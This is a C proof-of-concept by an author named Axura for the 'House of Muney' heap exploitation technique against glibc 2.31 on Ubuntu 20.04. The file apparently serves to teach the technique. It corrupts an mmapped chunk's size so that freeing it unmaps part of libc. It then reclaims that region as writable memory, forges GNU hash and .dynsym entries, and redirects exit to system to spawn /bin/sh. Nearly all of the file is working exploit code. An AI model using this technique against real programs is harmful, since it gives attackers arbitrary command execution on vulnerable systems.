/*
 * Title   : PoC for House of Muney  
 * Author  : Axura
 * Lab	   : glibc-2.31-0ubuntu9.9 (Ubuntu 20.04)
 * Website : https://4xura.com/house-of-muney
 * Compile : gcc -Wl,-z,lazy -g -o house_of_muney_glibc-2.31 house_of_muney_glibc-2.31.c
 *           (Some system may apply NOW to pre-resolve all symbols in libc by default, 
 *			 So we can use the `-z,lazy` flag in compilation to enable lazy binding)
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

// These offsets are libc-specific
#define PUTS_OFFSET			0x84420
#define SYSTEM_OFFSET		0x52290
#define BITMASK_OFFSET		0x3c8
#define BUCKETS_OFFSET		0xbc8
#define CHAIN_ZERO_OFFSET	0x1b64
#define DYNSYM_OFFSET		0x4070    	// .dynsym start
#define EXIT_STR_OFFSET		0x2efb		// string "exit" offset in .dynstr, for sym->st_name
#define EXIT_SYM_INDEX		0X87		// 135, true bucket

// Extract from GDB or retrieve in script before unmapped
#define BITMASK_WORD		0xf000028c2200930e
#define BUCKET				0x86		// bucket to start iterate				
#define NBUCKETS			0x3f3

// These values are fixed for Elf64_Sym structure in 64-bit system
#define ST_VALUE_OFFSET		0x8			
#define ST_SIZE				0x18

// Values of the members in symbol table for hijaced target 
#define ELF64_ST_INFO(bind, type) (((bind) << 4) | ((type) & 0x0F)) // Construct st_info from binding and type
#define STB_GLOBAL          1           // "exit" is global symbol
#define STT_FUNC            2           // "exit" is a code object
#define STV_DEFAULT	        0           // "exit" is default-visible, globally exported function
#define SHN_EXIT            0x000f      // "exit" is defined in section #15
#define SIZE_EXIT           0x20        // size for "exit" instructions is close to 0x20

// Calculated hash for symbol (use new hash method from dl-new-hash.h for latest glibc release)
#define NEW_HASH			0x7c967e3f	// dl_new_hash("exit")

// Caculate distance (offset)
#define DISTANCE(ptr1, ptr2) ((ptrdiff_t)((uint8_t *)(ptr1) - (uint8_t *)(ptr2)))

/* House of Muney is a leakless heap exploitation technique 
 * Because the mmaped chunks have a fixed offset to the libc base
 *  that they are adjacent to each other
 * So we can simply calculate the offsets for our targets according to our write entrance
 * But we will leak the libc base here for better understanding on
 * "How we hijack mmapped chunks overlapping libc mappings"
 * 
 * Additionally, this will be helpful to exploit against different mmap memory layout
 */
uintptr_t leak_libc_base() {
    uintptr_t puts_addr = (uintptr_t)puts;
    printf("[*] puts@libc = %p\n", (void *)puts_addr);

    uintptr_t libc_base = puts_addr - PUTS_OFFSET; 
    printf("[*] Computed libc base = %p\n", (void *)libc_base);

    return libc_base;
}

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
	
    /* Command string to execute */
    char *cmd = mmap((void *)0xdeadb000, 0x1000, PROT_READ | PROT_WRITE,
                       MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    strcpy(cmd, "/bin/sh");

    /* House of Muney */
    printf("[*] Demonstrating munmap overlap exploitation via mmap chunks\n\n");
    
    printf("[*] Step 1: Allocate a super-large chunk using malloc() → triggering mmap()\n");
    size_t *victim_ptr = malloc(0x30000);
    printf("[+] Victim chunk allocated at: %p (below libc), size: 0x%lx\n", victim_ptr-2, victim_ptr[-1]);
  
    printf("\n");
    
    puts("[*] Simulated high-to-low memory layout:\n"
         "    ld.so\n"
         "    ...\n"
         "    libc\n"
         "    victim chunk\n"
         "    ...\n"
         "    heap\n");

    /*
     * - Mappings
     *                           Start                End Perm     Size Offset File
     *                  0x555555557000     0x555555558000 r--p     1000   2000 /home/axura/hacker/house_of_muney_glibc-2.31
     *                  0x555555558000     0x555555559000 rw-p     1000   3000 /home/axura/hacker/house_of_muney_glibc-2.31
     *                  0x555555559000     0x55555557a000 rw-p    21000      0 [heap]
     *   mmap chunk ➤  0x7ffff7d9e000     0x7ffff7dcf000 rw-p    31000      0 [anon_7ffff7d9e]
     *       Hijack ➤  0x7ffff7dcf000     0x7ffff7df1000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so
     *                  0x7ffff7df1000     0x7ffff7f69000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
     *                  0x7ffff7f69000     0x7ffff7fb7000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
     *   
     *  - Target libc Internal
     * 
     *              0x00007ffff7dcf350 - 0x00007ffff7dcf370 is .note.gnu.property in /lib/x86_64-linux-gnu/libc.so.6
     *              0x00007ffff7dcf370 - 0x00007ffff7dcf394 is .note.gnu.build-id in /lib/x86_64-linux-gnu/libc.so.6
     *              0x00007ffff7dcf394 - 0x00007ffff7dcf3b4 is .note.ABI-tag in /lib/x86_64-linux-gnu/libc.so.6
     *              0x00007ffff7dcf3b8 - 0x00007ffff7dd306c is .gnu.hash in /lib/x86_64-linux-gnu/libc.so.6
     *              0x00007ffff7dd3070 - 0x00007ffff7de0ea0 is .dynsym in /lib/x86_64-linux-gnu/libc.so.6
     *              0x00007ffff7de0ea0 - 0x00007ffff7de6f61 is .dynstr in /lib/x86_64-linux-gnu/libc.so.6
     *              0x00007ffff7de6f62 - 0x00007ffff7de81e6 is .gnu.version in /lib/x86_64-linux-gnu/libc.so.6
     */
    
    printf("[*] Step 2: Corrupt size field of the victim chunk to cover libc parts\n");
    
    size_t libc_overwrite_size = 0x10000;  // target region (.gnu.hash/.dynsym)
    size_t victim_size = (victim_ptr)[-1];
    
    size_t fake_size = (victim_size + libc_overwrite_size) & ~0xfff;
    fake_size |= 0b10;  // Preserve IS_MMAPPED bit
    
    victim_ptr[-1] = fake_size;
    printf("[+] Updated victim_size chunk size to: 0x%lx\n", victim_ptr[-1]);
	
    printf("\n");

    printf("[*] Step 3: Free corrupted victim chunk → triggers munmap on both chunks and libc area\n");
    
    void *munmap_start = (void *)(victim_ptr - 2);
    void *munmap_end   = (void *)((char *)munmap_start + (fake_size & ~0x7));
    printf("[*] munmap will unmap: %p → %p (size: 0x%lx)\n", munmap_start, munmap_end, fake_size);
    
    free(victim_ptr);
    printf("[+] Victim chunk has now been freed\n");
    printf("[!] .gnu.hash and .dynsym are now unmapped. New symbol resolutions will fail!\n");
    
    /*
     *  - For mmap chunks, glibc malloc directly calls munmap() on free().
     *
     *  - Unlike normal heap chunks (which become UAF), a munmapped chunk
     *    is fully returned to the kernel and becomes inaccessible.
     *
     *  - If we try accessing the freed mmap memory, it causes a segfault.
     *
     *  - Our goal is to reclaim this unmapped memory by issuing a new
     *    malloc() that overlaps the freed area — effectively overlapping
     *    a new mmap chunk over libc, including .dynsym and .gnu.hash.
     *
     *  - WARNING: Any new dynamically resolved function (like assert(), etc.)
     *    will crash if its symbol isn't already resolved before the munmap.
     *    This is because symbol resolution related sections are now GONE.
     *
     *  => Now we will reallocate the freed chunk and write our symbol resolution
     *     logic on the hijacked sections
     */
    
    printf("\n");

    printf("[*] Step 4: Reallocate a larger overlapping mmap chunk to reclaim unmapped area\n");
    size_t *overlap_ptr = malloc(0x100000);  // large enough to overlap munmapped region
    
    size_t overlap_start = overlap_ptr - 2;  
    size_t overlap_size  = overlap_ptr[-1] & ~0xfff;      
    size_t overlap_end   = overlap_start + overlap_size;
    
    printf("[+] Overlapping chunk start : %p\n", overlap_start);
    printf("[+] Overlapping chunk end   : %p\n", overlap_end);
    printf("[+] Overlapping chunk size  : 0x%lx\n", overlap_size);

    printf("\n");
    
    printf("[*] Step 5: Leak libc base address, before overwriting our targets on libc mappings\n");
    printf("[!] House of Muney requires no leaks for the libc or heap address\n");
    printf("[!] Because the mmaped chunks have a fixed offset to the libc base\n");
    printf("[!] Here, we leak it in this PoC to illustrate this offset\n");
    printf("[!] (And so that we can modify this PoC when we have a different mmap layout,\n");
    printf("[!]     e.g. changing mmap sizes, chunk amount, testing in different versions of glibc, etc.)\n");

    uintptr_t libc_base = leak_libc_base();
    printf("[+] libc base: %p\n", libc_base);

    printf("\n");
    
    // check if victim chunk, .gnu.hash, .dynsym (higher) overlapped
    uintptr_t dynsym_addr = libc_base + DYNSYM_OFFSET;
    printf("[*] .dynsym section starts at %p\n", dynsym_addr);
	printf("[*] Checking overlap covers .dynsym: [%p → %p)\n", (void *)overlap_start, (void *)overlap_end);

	if (!(overlap_start <= dynsym_addr && dynsym_addr < overlap_end)) {
        const char *msg = "[!] Overlap does not cover .dynsym — aborting\n";
        write(2, msg, strlen(msg));
        _exit(1);
    }
    
    printf("[✓] We can now rewrite internal glibc sections: .gnu.hash, .dynsym, etc.\n");

    printf("\n");
    
    printf("[*] Step 6: Calculate offsets of in-libc target addresses to overwrite\n");
    printf("            Here we simulate to write starting from the allocated victim chunk\n");
    printf("            So we will calculate the offsets of the targets to the overlapped chunk\n");
    printf("            Start writing from the entry at: %p\n", overlap_ptr);

    // uint64_t write_to_libc_offset = (uint64_t)libc_base - (uint64_t)overlap_ptr;
    ptrdiff_t write_to_libc_offset  = DISTANCE(libc_base, overlap_ptr);
    ptrdiff_t bitmask_word_offset   = BITMASK_OFFSET + ((NEW_HASH / 0x40) & 0xff) * 8;	// bitmask_word for "exit"
    uint32_t bucket_index           = NEW_HASH % NBUCKETS;	// bucket index for "exit" (0xc4)
    ptrdiff_t bucket_offset         = BUCKETS_OFFSET + bucket_index * 4;	// bucket for "exit"
    ptrdiff_t hasharr_offset        = CHAIN_ZERO_OFFSET + BUCKET * 4;	// hasharr[i] for "exit"
        
    size_t bitmask_word_addr    = (size_t)overlap_ptr + write_to_libc_offset + bitmask_word_offset;
    size_t bucket_addr          = (size_t)overlap_ptr + write_to_libc_offset + bucket_offset;
    size_t hasharr_addr         = (size_t)overlap_ptr + write_to_libc_offset + hasharr_offset;
    size_t exit_symtab_addr     = (size_t)overlap_ptr + write_to_libc_offset + DYNSYM_OFFSET + EXIT_SYM_INDEX * ST_SIZE;	// [!] Hijack 

    printf("[+] bitmask_word addr: %p, offset to mmap chunk pt: 0x%tx\n", (void *)bitmask_word_addr, DISTANCE(bitmask_word_addr, overlap_ptr));
    printf("[+] bucket addr      : %p, offset to mmap chunk pt: 0x%tx\n", (void *)bucket_addr, DISTANCE(bucket_addr, overlap_ptr));
    printf("[+] hasharr addr     : %p, offset to mmap chunk pt: 0x%tx\n", (void *)hasharr_addr, DISTANCE(hasharr_addr, overlap_ptr));
    printf("[+] exit@dynsym addr : %p, offset to mmap chunk pt: 0x%tx\n", (void *)exit_symtab_addr, DISTANCE(exit_symtab_addr, overlap_ptr));

    printf("\n");
    
    /*
     *  - When glibc is loaded via ld-linux, its .text, .dynsym, .gnu.hash, etc. sections are mapped as:
     *    	.text    : r-xp
     *      .gnu.hash: r--p 
     *    	.dynsym  : r--p
     *
     *    They are marked read-only in /proc/self/maps
	 *
	 *  - In House of Muney:
     *    After the munmap() triggered via free(mmap_chunk) releases parts of the libc mapping (like .gnu.hash, .dynsym),
     *    a subsequent malloc() (which becomes an mmap() internally) reclaims the same virtual memory range.
     *    But with read-write permissions!
     *    Because it’s now a fresh anonymous mapping owned by the process, not libc's original read-only mapping.
     *    
     *  - So, the new mapping is:
     *       rw-p (read/write/private) 
     *    Because that's what malloc() requests for data chunks.
     *
     *  => This is the core primitive behind House of Muney.
     */
    
    printf("[*] Step 7: Overwrite glibc’s GNU Hash Table related stuff\n");

    *(uint64_t *)bitmask_word_addr = BITMASK_WORD;
    printf("[+] bitmask_word (%lx) in bitmask[indice] for 'exit' populated @ %p!\n", BITMASK_WORD, bitmask_word_addr);
    
    *(uint32_t *)bucket_addr = BUCKET;
    printf("[+]  bucket value (%d) in buckets[index]  for 'exit' populated @ %p!\n", BUCKET, bucket_addr);
    
    /* Hash will be checked at 2nd loop for the "true" bucket 0x87 of exit 
     * And it must be - if we write the hash on the location calculated according to bucket (0x86) - it fails
     * That's why I describe the index from readelf for "exit" (0x87) is the true bucket
     */
    uint32_t hash = NEW_HASH ^ 1;
    // *(uint32_t *)hasharr_addr = NEW_HASH ^ 1;
    *((uint32_t *)hasharr_addr + 1) = hash;	
	printf("[+] hasharr value (%d) populated @ %p!\n", hash, hasharr_addr);
    
    printf("\n");
    
    /*
     *  - Exit symbol table and its offset:
     *
     *      pwndbg> ptype /o $exit_sym
     *      type = struct {
     *           0      |       4     Elf64_Word st_name;       // Offset in .dynstr
     *           4      |       1     unsigned char st_info;    // Symbol type and binding
     *           5      |       1     unsigned char st_other;   // Visibility
     *           6      |       2     Elf64_Section st_shndx;   // Section index
     *           8      |       8     Elf64_Addr st_value;      // Resolved address (Hijack in exploit)
     *          16      |       8     Elf64_Xword st_size;      // Size of the object (usually 0 for funcs like exit)
	 *
     *                              total size (bytes):   24 
     *                         }
     */

    printf("[*] Step 8: Patch [.dynsym] to redirect 'exit' to 'system'\n\n");

    typedef struct {
        uint32_t st_name;     // 0  Offset into .dynstr
        uint8_t  st_info;     // 4  Type and binding
        uint8_t  st_other;    // 5  Visibility
        uint16_t st_shndx;    // 6  Section index
        uint64_t st_value;    // 8  Symbol value (resolved address)
        uint64_t st_size;     // 16 Size of the object
    } Elf64_Sym;

    Elf64_Sym *exit_symbol_table = (Elf64_Sym*)exit_symtab_addr;

    /* Recovery (0xf001200002ef) */
    printf("[*] Patching st_name with the offset pointing back to exit@dynstr...\n");
    exit_symbol_table->st_name = EXIT_STR_OFFSET;
    printf("[+] exit@dynstr → 'exit'\n");

    printf("[*] Patching st_info for typing & binding...\n");
    uint8_t st_info_val = ELF64_ST_INFO(STB_GLOBAL, STT_FUNC);
    exit_symbol_table->st_info = st_info_val;   // (0x1 << 4) | 0x2 = 0x12
    printf("[+] st_info is now patched as 0x%02x\n", st_info_val);

    printf("[*] Patching st_other for symbol visibility...\n");
    exit_symbol_table->st_other = STV_DEFAULT;  // 0
    printf("[+] st_other is now patched as 0x%02x\n", STV_DEFAULT);

    printf("[*] Patching st_shndx for telling symbol section index...\n");
    exit_symbol_table->st_shndx = SHN_EXIT; // 0x000f
    printf("[+] st_shndx is now patched as 0x%04x\n", SHN_EXIT);

    printf("[*] Patching st_shndx for telling symbol section index...\n");
    printf("[*] Though this is not neccessary to populte in House of Muney\n");
    exit_symbol_table->st_size = SIZE_EXIT; // 0x20
    printf("[+] st_shndx is now patched as 0x%016lx\n", SIZE_EXIT);

    printf("\n");

    /* Hijack exit → system */
    printf("[*] [HIIJACK] Overwrite st_value in the 'exit' symbol table with offset of system func call\n");
    exit_symbol_table->st_value = SYSTEM_OFFSET;
    printf("[+] exit@dynsym → system()\n");
    
    printf("\n");

    printf(
        "[!] Now the exit .dynsym table structures as:\n\n"
        "    typedef struct {\n"
        "        uint32_t st_name;     // Offset into .dynstr   - 0: 0x%x\n"
        "        uint8_t  st_info;     // Type and binding      - 4: 0x%02x\n"
        "        uint8_t  st_other;    // Visibility            - 5: 0x%02x\n"
        "        uint16_t st_shndx;    // Section index         - 6: 0x%04x\n"
        "        uint64_t st_value;    // Resolved address      - 8: 0x%016lx\n"
        "        uint64_t st_size;     // Size of the object    - 16: 0x%lx\n"
        "    } Elf64_Sym;\n\n",
        EXIT_STR_OFFSET, st_info_val, STV_DEFAULT, SHN_EXIT, SYSTEM_OFFSET, SIZE_EXIT
    );
    
    printf("\n");
    
    printf("[*] Step 9: Trigger symbol resolution for hijacked function\n");
    printf("[✓] Calling exit(\"/bin/sh\") → now system(\"/bin/sh\")\n");
    exit((uintptr_t)cmd);
}